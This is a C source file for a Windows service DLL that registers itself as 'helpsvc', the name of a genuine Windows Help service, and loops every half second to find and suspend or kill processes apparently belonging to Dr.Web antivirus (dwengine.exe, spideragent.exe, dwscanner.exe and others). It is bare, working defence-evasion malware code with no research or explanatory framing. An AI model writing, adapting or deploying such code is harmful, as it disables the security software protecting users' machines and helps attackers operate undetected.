#include <windows.h>
#include <TlHelp32.h>
#include "ntdll\ntdll.h"
#include "ntdll\winnative.h"
#include "rtls\prtl.h"

#pragma warning(disable:4100) // warning C4100: unreferenced formal parameter

static const TCHAR				ServiceName[] = TEXT("helpsvc");

static SERVICE_STATUS_HANDLE	ssh = NULL;
static SERVICE_STATUS			statusrec;
static BOOL						quit = FALSE;

#define EXPORT_FN __declspec(dllexport)

EXPORT_FN VOID WINAPI 
	ServiceMain(__in  DWORD dwArgc, __in  LPTSTR *lpszArgv);


DWORD WINAPI HandlerEx1(
	DWORD    dwControl,
    DWORD    dwEventType,
    LPVOID   lpEventData,
    LPVOID   lpContext
    )
{
	switch ( dwControl )
	{
	case SERVICE_CONTROL_STOP:
		statusrec.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(ssh, &statusrec);
		quit = TRUE;
		return NO_ERROR;

	case SERVICE_CONTROL_INTERROGATE:
		return NO_ERROR;
	}

	return ERROR_CALL_NOT_IMPLEMENTED;
}

#define ProcessesCount 6
LPTSTR Processes[ProcessesCount] = {
	TEXT("dwengine.exe"), 
	TEXT("dwarkdaemon.exe"),
	TEXT("spideragent.exe"),
	TEXT("dwscanner.exe"),
	TEXT("dwnetfilter.exe"),
	TEXT("spideragent_adm.exe")
};

BOOL IsInList(
	LPTSTR szProcessName
	)
{
	INT i;

	for (i = 0; i < ProcessesCount; i++) {

		if (lstrcmpi(Processes[i], szProcessName) == 0)
			return TRUE;

	}
	return FALSE;
}

VOID ListProcesses()
{
	PROCESSENTRY32 Entry;
	HANDLE ShotHandle;
	HANDLE hProcess;
	BOOL IsDwService = FALSE;

	Entry.dwSize = sizeof(PROCESSENTRY32);

	ShotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if ( ShotHandle != INVALID_HANDLE_VALUE ) {
		if (Process32First(ShotHandle, &Entry)) {
			do {
				if ( IsInList(Entry.szExeFile) ) {

					if (lstrcmpi(Entry.szExeFile, TEXT("dwengine.exe")) == 0) 
						IsDwService = TRUE;
					else
						IsDwService = FALSE;

					hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Entry.th32ProcessID);
					if (hProcess) {

						if (IsDwService == TRUE) {
							NtSuspendProcess(hProcess);
						} else {
							NtTerminateProcess(hProcess, 0);
						}
						CloseHandle(hProcess);
					}
				}
			} while (Process32Next(ShotHandle, &Entry));
		}
		CloseHandle(ShotHandle);
	}
}

VOID WINAPI ServiceMain(__in  DWORD dwArgc, __in  LPTSTR *lpszArgv)
{
	ssh = RegisterServiceCtrlHandlerEx(ServiceName, &HandlerEx1, NULL);
	if ( ssh == NULL )
		return;

	statusrec.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	statusrec.dwCurrentState = SERVICE_RUNNING;
	statusrec.dwControlsAccepted = SERVICE_CONTROL_STOP;
	statusrec.dwWin32ExitCode = 0;
	statusrec.dwServiceSpecificExitCode = 0;
	statusrec.dwCheckPoint = 0;
	statusrec.dwWaitHint = 0;

	SetServiceStatus(ssh, &statusrec);

	while ( !quit ) {

		ListProcesses();
		Sleep(500);
	}

	statusrec.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(ssh, &statusrec);
}

BOOL WINAPI DllMain(
  __in  HINSTANCE hinstDLL,
  __in  DWORD fdwReason,
  __in  LPVOID lpvReserved
)
{
	DisableThreadLibraryCalls(hinstDLL);
	return TRUE;
}